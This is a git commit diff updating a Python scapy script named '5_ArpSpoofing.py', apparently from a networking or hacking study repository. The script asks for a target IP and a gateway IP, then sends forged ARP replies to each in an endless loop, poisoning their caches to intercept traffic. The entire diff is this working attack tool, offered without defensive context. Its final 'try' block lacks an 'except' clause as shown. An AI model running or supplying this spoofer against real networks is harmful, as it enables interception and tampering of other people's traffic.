9ac1b1c3d79ef6de2dd0e01853dc2a8715721657
Vladiik <114525164+Vladiik124@users.noreply.github.com>
2024-11-29 03:05:51 +0000

    Update 5_ArpSpoofing.py

--- arpSpoofing/5_ArpSpoofing.py
+++ arpSpoofing/5_ArpSpoofing.py
@@ -1,13 +1,15 @@
 import scapy.all as scapy
 import time
-def get_mac(ip):
-    arp_request = scapy.ARP(pdst = ip)
-    broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
-    arp_request_broadcast = broadcast/arp_request
-    answered_list = scapy.srp(arp_request_broadcast, timeout=5,verbose = False)[0]
-    return answered_list[0][1].hwsrc
 
+cooldown = 5
+ip_target = input("Enter target's IP address: ")
+ip_gateway = input ("Enter gateway IP address: ")
 def spoof(target_ip, spoof_ip):
-    packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = get_mac(target_ip),psrc = spoof_ip)
-
+    packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = scapy.getmacbyip(target_ip),psrc = spoof_ip)
     scapy.send(packet, verbose=False)
+
+try:
+    while True:
+        spoof(ip_target, ip_gateway)
+        spoof(ip_gateway, ip_target)
+        time.sleep(cooldown)
